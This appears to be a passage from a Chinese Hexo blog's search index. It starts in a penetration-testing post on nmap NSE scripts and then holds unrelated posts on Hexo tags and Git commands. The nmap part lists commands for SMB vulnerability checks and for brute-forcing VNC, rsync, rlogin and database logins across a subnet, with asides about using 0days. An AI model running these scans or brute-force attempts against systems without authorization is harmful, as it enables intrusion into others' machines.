smb漏洞检测脚本集::</h3><p>smb-vuln-ms08-067.nse<br>smb-vuln-ms10-054.nse<br>smb-vuln-ms10-061.nse<br>smb-vuln-ms17-010.nse       smb远程执行</p><pre class="line-numbers language-bash"><code class="language-bash">nmap -p445 --script smb-vuln-ms17-010.nse 192.168.3.0/24<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="0x15-检测内网嗅探-实际测试中-貌似并没什么卵用-难道是我实验有误"><a href="#0x15-检测内网嗅探-实际测试中-貌似并没什么卵用-难道是我实验有误" class="headerlink" title="0x15 检测内网嗅探,实际测试中,貌似并没什么卵用,难道是我实验有误"></a>0x15 检测内网嗅探,实际测试中,貌似并没什么卵用,难道是我实验有误</h3><p>sniffer-detect.nse</p><pre class="line-numbers language-bash"><code class="language-bash">nmap -sn -Pn --script sniffer-detect.nse 192.168.3.0/24<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="0x16-其它的一些辅助性脚本"><a href="#0x16-其它的一些辅助性脚本" class="headerlink" title="0x16 其它的一些辅助性脚本:"></a>0x16 其它的一些辅助性脚本:</h3><p>rsync-brute.nse     爆破目标的rsync</p><pre class="line-numbers language-bash"><code class="language-bash">nmap -p 873 --script rsync-brute --script-args <span class="token string">'rsync-brute.module=www'</span> 192.168.3.0/24<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>rlogin-brute.nse     爆破目标的rlogin</p><pre class="line-numbers language-bash"><code class="language-bash">nmap -p 513 --script rlogin-brute 192.168.3.0/24<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>vnc-brute.nse       爆破目标的vnc</p><pre class="line-numbers language-bash"><code class="language-bash">nmap --script vnc-brute -p 5900 192.168.3.0/24<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>pcanywhere-brute.nse     爆破pcanywhere</p><pre class="line-numbers language-bash"><code class="language-bash">nmap -p 5631 --script<span class="token operator">=</span>pcanywhere-brute 192.168.3.0/24<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>nessus-brute.nse     爆破nessus,貌似现在已经不是1241端口了,实在是太老了,直接忽略吧</p><pre class="line-numbers language-bash"><code class="language-bash">nmap --script nessus-brute -p 1241 192.168.3.0/24<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>nexpose-brute.nse     爆破nexpose</p><pre class="line-numbers language-bash"><code class="language-bash">nmap --script nexpose-brute -p 3780 192.168.3.0/24<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>shodan-api.nse      配合shodan接口进行扫描,如果自己手里有0day,这个威力还是不可小觑的</p><pre class="line-numbers language-bash"><code class="language-bash">nmap --script shodan-api --script-args <span class="token string">'shodan-api.target=192.168.3.0/24,shodan-api.apikey=SHODANAPIKEY'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="0x17-尝试利用nmap一句话进行目标C段常规漏洞扫描"><a href="#0x17-尝试利用nmap一句话进行目标C段常规漏洞扫描" class="headerlink" title="0x17 尝试利用nmap一句话进行目标C段常规漏洞扫描"></a>0x17 尝试利用nmap一句话进行目标C段常规漏洞扫描</h3><p>实际测试中,会非常的慢,可能跑一个脚本验证时间都要很长,尤其在你的vps带宽不是很足,网络又不怎么好的时候,速度就更慢了,所以还是建议先大致扫一眼目标服务,然后再单独针对性的扫,这样实际的成功率可能会高很多,毕竟,不是像masscan或者zamp这种基于无状态的扫描:</p><pre class="line-numbers language-bash"><code class="language-bash">nmap -sT -Pn -v --script dns-zone-transfer.nse,ftp-anon.nse,ftp-proftpd-backdoor.nse,ftp-vsftpd-backdoor.nse,ftp-vuln-cve2010-4221.nse,http-backup-finder.nse,http-cisco-anyconnect.nse,http-iis-short-name-brute.nse,http-put.nse,http-php-version.nse,http-bashshock.nse,http-robots.txt.nse,http-svn-enum.nse,http-webdav-scan.nse,iis-buffer-overflow.nse,iax2-version.nse,memcached-info.nse,mongodb-info.nse,msrpc-enum.nse,ms-sql-info.nse,mysql-info.nse,nrpe-enum.nse,pptp-version.nse,redis-info.nse,rpcinfo.nse,samba-vuln-cve-2012-1182.nse,smb-vuln-ms08-067.nse,smb-vuln-ms17-010.nse,snmp-info.nse,sshv1.nse,xmpp-info.nse,tftp-enum.nse,teamspeak2-version.nse 192.168.3.0/24<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>尝试利用nmap一句话进行目标C段弱口令爆破,还是上面的问题,验证一个漏洞都要那么久,更不要说跑完一个弱口令字典,nmap默认的弱口令字典大概是5000左右,也就是说一个用户名就要跑大概5000次,估计你vps带宽再小点儿的话,这个就没什么谱了,毕竟我们是在公网,不是在内网,所以,还是建议最好不要同时加载很多个弱口令爆破脚本,如果实在没办法必须爆破,可以多花点儿时间,去搜集目标有价值的用户名,以此尽可能提高自己的命中率:</p><pre class="line-numbers language-bash"><code class="language-bash">nmap -sT -v -Pn --script ftp-brute.nse,imap-brute.nse,smtp-brute.nse,pop3-brute.nse,mongodb-brute.nse,redis-brute.nse,ms-sql-brute.nse,rlogin-brute.nse,rsync-brute.nse,mysql-brute.nse,pgsql-brute.nse,oracle-sid-brute.nse,oracle-brute.nse,rtsp-url-brute.nse,snmp-brute.nse,svn-brute.nse,telnet-brute.nse,vnc-brute.nse,xmpp-brute.nse 192.168.3.0/24<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="0x18后话"><a href="#0x18后话" class="headerlink" title="0x18后话:"></a>0x18后话:</h3><p> 由于nmap内置丰富的漏洞扫描脚本,也使得nmap的能力在一定程度得到了极大的扩展,意味者我们完全可以自己按照nmap事先规定好的语法来模仿实现一些简单的定制扫描,这也是让我感觉nmap做的非常好的一点,极大的可扩展性,比如,你自己握有0day时,想自动化干点儿什么事儿,嘿嘿……具体就不多说了,相信大家都懂, 希望不要撞到别人的蜜罐中去就好了,不然Nday就可惜了  ,没错,masscan,zmap这种基于无状态的扫描确实快的吓人,而且shodan api也是个很不错的选择,但对定制脚本支持始终还是差了点,时间关系只挑了一些可能用到的脚本,今天就简单聊到这儿吧,工具没有没有好坏,虽然实战中不一定都能用上,关键还是大家在实际渗透过程中能灵活变通就好,话说回来,这一切的前提都是建立在别人让你扫的基础之上的,nmap的标志实在是太招摇过市了,nmap所支持的那几种扫描类型,估计早已被各种ids所免疫,说实话,有些目标可能都没什么机会让你扫,关于nmap其它的一些用法,后期遇到相对比较实用的会不定期再更新上来,大家如果有兴趣,也可以直接去参考官方,那里说的还是非常详细的,起码比我这个要详细很多,有任何问题请直接私信我</p>]]></content>
      
      
      <categories>
          
          <category> PenTest </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PenTest </tag>
            
            <tag> PenTestTool </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hexo使用tags错误</title>
      <link href="/2019/03/24/hexo-shi-yong-tags-cuo-wu/"/>
      <url>/2019/03/24/hexo-shi-yong-tags-cuo-wu/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><pre><code>tags:  - tag1  - tag2</code></pre><h4 id="添加标签-tag"><a href="#添加标签-tag" class="headerlink" title="添加标签(tag)"></a>添加标签(tag)</h4><p>hexo new page tags</p><ol><li>站点_config.yml中有tag_dir: tags</li><li>主题配置(theme/_config.yml)文件里有tags: /tags</li><li>编辑站点的source/tags/index.md，添加<pre><code>title: tagsdate: 2015-10-20 06:49:50type: tagscomments: false</code></pre></li></ol><h4 id="添加分类-categories"><a href="#添加分类-categories" class="headerlink" title="添加分类(categories)"></a>添加分类(categories)</h4><p> hexo new page categories</p><ol><li>站点_config.yml中有tag_dir: categories</li><li>主题配置(theme/_config.yml)categories: /categories</li><li>编辑站点的source/categories/index.md，添加<pre><code>title: categoriesdate: 2015-10-20 06:49:50type: categoriescomments: false</code></pre></li></ol><p>编辑好后 hexo g 重新生成静态即可</p>]]></content>
      
      
      <categories>
          
          <category> hexo </category>
          
      </categories>
      
      
        <tags>
            
            <tag> hexo </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Git常用命令大全</title>
      <link href="/2019/01/21/git-chang-yong-ming-ling-da-quan/"/>
      <url>/2019/01/21/git-chang-yong-ming-ling-da-quan/</url>
      
        <content type="html"><![CDATA[<h2 id="Git常用命令"><a href="#Git常用命令" class="headerlink" title="Git常用命令"></a>Git常用命令</h2><a id="more"></a><h3 id="最常用命令"><a href="#最常用命令" class="headerlink" title="最常用命令"></a>最常用命令</h3><h5 id="添加"><a href="#添加" class="headerlink" title="添加"></a>添加</h5><p>git add -A * -f  添加文件<br>git commit -m “v0.1”</p><h5 id="推送"><a href="#推送" class="headerlink" title="推送"></a>推送</h5><p>git push -u origin master</p><h5 id="删除"><a href="#删除" class="headerlink" title="删除"></a>删除</h5><p>git rm -r –cached  名字<br>git commit -m “<strong>**</strong>“<br>git push -u origin master</p><hr><h3 id="Git-常用命令速查"><a href="#Git-常用命令速查" class="headerlink" title="Git 常用命令速查"></a>Git 常用命令速查</h3><p>git branch 查看本地所有分支<br>git status 查看当前状态<br>git commit 提交<br>git branch -a 查看所有的分支<br>git branch -r 查看远程所有分支<br>git commit -am “init” 提交并且加注释<br>git remote add origin <a href="mailto:git@192.168.1.119" target="_blank" rel="noopener">git@192.168.1.119</a>:ndshow<br>git push origin master 将文件给推到服务器上<br>git remote show origin 显示远程库origin里的资源<br>git push origin master:develop<br>git push origin master:hb-dev 将本地库与服务器上的库进行关联<br>git checkout –track origin/dev 切换到远程dev分支<br>git branch -D master develop 删除本地库develop<br>git checkout -b dev 建立一个新的本地分支dev<br>git merge origin/dev 将分支dev与当前分支进行合并<br>git checkout dev 切换到本地dev分支<br>git remote show 查看远程库<br>git add .<br>git rm 文件名(包括路径) 从git中删除指定文件<br>git clone git://github.com/schacon/grit.git 从服务器上将代码给拉下来<br>git config –list 看所有用户<br>git ls-files 看已经被提交的<br>git rm [file name] 删除一个文件<br>git commit -a 提交当前repos的所有的改变<br>git add [file name] 添加一个文件到git index<br>git commit -v 当你用－v参数的时候可以看commit的差异<br>git commit -m “This is the message describing the commit” 添加commit信息<br>git commit -a -a是代表add，把所有的change加到git index里然后再commit<br>git commit -a -v 一般提交命令<br>git log 看你commit的日志<br>git diff 查看尚未暂存的更新<br>git rm a.a 移除文件(从暂存区和工作区中删除)<br>git rm –cached a.a 移除文件(只从暂存区中删除)<br>git commit -m “remove” 移除文件(从Git中删除)<br>git rm -f a.a 强行移除修改后文件(从暂存区和工作区中删除)<br>git diff –cached 或 $ git diff –staged 查看尚未提交的更新<br>git stash push 将文件给push到一个临时空间中<br>git stash pop 将文件从临时空间pop下来<br>git remote add origin <a href="mailto:git@github.com" target="_blank" rel="noopener">git@github.com</a>:username/Hello-World.git<br>git push origin master 将本地项目给提交到服务器中<br>git pull 本地与服务器端同步<br>git push (远程仓库名) (分支名) 将本地分支推送到服务器上去。<br>git fetch 相当于是从远程获取最新版本到本地，不会自动merge<br>git commit -a -m “log_message” (-a是提交所有改动，-m是加入log信息) 本地修改同步至服务器端 ：<br>git branch branch_0.1 master 从主分支master创建branch_0.1分支<br>git branch -m branch_0.1 branch_1.0 将branch_0.1重命名为branch_1.0<br>git checkout branch_1.0/master 切换到branch_1.0/master分支<br>du -hs<br>git branch 删除远程branch<br>git push origin :branch_remote_name<br>git branch -r -d branch_remote_name<br>初始化版本库，并提交到远程服务器端<br>mkdir WebApp<br>cd WebApp<br>git init 本地初始化<br>touch README<br>git add README 添加文件<br>git commit -m ‘first commit’<br>git remote add origin <a href="mailto:git@github.com" target="_blank" rel="noopener">git@github.com</a>:daixu/WebApp.git</p><p>增加一个远程服务器端</p><p>上面的命令会增加URL地址为‘git@github.com:daixu/WebApp.git’，名称为origin的远程服务器库，以后提交代码的时候只需要使用 origin别名即可</p><h3 id="命令速查表"><a href="#命令速查表" class="headerlink" title="命令速查表"></a>命令速查表</h3><ol><li><p>常用的Git命令<br>git add 添加至暂存区<br>git add–interactive 交互式添加<br>git apply 应用补丁<br>git am 应用邮件格式补丁<br>git annotate 同义词，等同于 git blame<br>git archive 文件归档打包<br>git bisect 二分查找<br>git blame 文件逐行追溯<br>git branch 分支管理<br>git cat-file 版本库对象研究工具<br>git checkout 检出到工作区、切换或创建分支<br>git cherry-pick 提交拣选<br>git citool 图形化提交，相当于 git gui 命令<br>git clean 清除工作区未跟踪文件<br>git clone 克隆版本库<br>git commit 提交<br>git config 查询和修改配置<br>git describe 通过里程碑直观地显示提交ID<br>git diff 差异比较<br>git difftool 调用图形化差异比较工具<br>git fetch 获取远程版本库的提交<br>git format-patch 创建邮件格式的补丁文件。参见 git am 命令<br>git grep 文件内容搜索定位工具<br>git gui 基于Tcl/Tk的图形化工具，侧重提交等操作<br>git help 帮助<br>git init 版本库初始化<br>git init-db<em> 同义词，等同于 git init<br>git log 显示提交日志<br>git merge 分支合并<br>git mergetool 图形化冲突解决<br>git mv 重命名<br>git pull 拉回远程版本库的提交<br>git push 推送至远程版本库<br>git rebase 分支变基<br>git rebase–interactive 交互式分支变基<br>git reflog 分支等引用变更记录管理<br>git remote 远程版本库管理<br>git repo-config</em> 同义词，等同于 git config<br>git reset 重置改变分支“游标”指向<br>git rev-parse 将各种引用表示法转换为哈希值等<br>git revert 反转提交<br>git rm 删除文件<br>git show 显示各种类型的对象<br>git stage* 同义词，等同于 git add<br>git stash 保存和恢复进度<br>git status 显示工作区文件状态<br>git tag 里程碑管理</p></li><li><p>对象库操作相关命令<br>git commit-tree 从树对象创建提交<br>git hash-object 从标准输入或文件计算哈希值或创建对象<br>git ls-files 显示工作区和暂存区文件<br>git ls-tree 显示树对象包含的文件<br>git mktag 读取标准输入创建一个里程碑对象<br>git mktree 读取标准输入创建一个树对象<br>git read-tree 读取树对象到暂存区<br>git update-index 工作区内容注册到暂存区及暂存区管理<br>git unpack-file 创建临时文件包含指定 blob 的内容<br>git write-tree 从暂存区创建一个树对象</p></li><li><p>引用操作相关命令<br>git check-ref-format 检查引用名称是否符合规范<br>git for-each-ref 引用迭代器，用于shell编程<br>git ls-remote 显示远程版本库的引用<br>git name-rev 将提交ID显示为友好名称<br>git peek-remote* 过时命令，请使用 git ls-remote<br>git rev-list 显示版本范围<br>git show-branch 显示分支列表及拓扑关系<br>git show-ref 显示本地引用<br>git symbolic-ref 显示或者设置符号引用<br>git update-ref 更新引用的指向<br>git verify-tag 校验 GPG 签名的Tag</p></li></ol><ol start="4"><li>版本库管理相关命令<br>git count-objects 显示松散对象的数量和磁盘占用<br>git filter-branch 版本库重构<br>git fsck 对象库完整性检查<br>git fsck-objects<em> 同义词，等同于 git fsck<br>git gc 版本库存储优化<br>git index-pack 从打包文件创建对应的索引文件<br>git lost-found</em> 过时，请使用 git fsck –lost-found 命令<br>git pack-objects 从标准输入读入对象ID，打包到文件<br>git pack-redundant 查找多余的 pack 文件<br>git pack-refs 将引用打包到 .git/packed-refs 文件中<br>git prune 从对象库删除过期对象<br>git prune-packed 将已经打包的松散对象删除<br>git relink 为本地版本库中相同的对象建立硬连接<br>git repack 将版本库未打包的松散对象打包<br>git show-index 读取包的索引文件，显示打包文件中的内容<br>git unpack-objects 从打包文件释放文件<br>git verify-pack 校验对象库打包文件 </li></ol><h3 id="git常用命令表"><a href="#git常用命令表" class="headerlink" title="git常用命令表"></a>git常用命令表</h3><p><img src="git.png" alt></p>]]></content>
      
      
      <categories>
          
          <category> Git </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Git </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>你好，朋友</title>
      <link href="/2019/01/21/ni-hao-peng-you/"/>
      <url>/2019/01/21/ni-hao-peng-you/</url>
      
        <content type="html"><![CDATA[<p><img src="haha.png" alt="hello"></p>]]></content>
      
      
      <categories>
          
          <category> 随笔 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 随笔 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
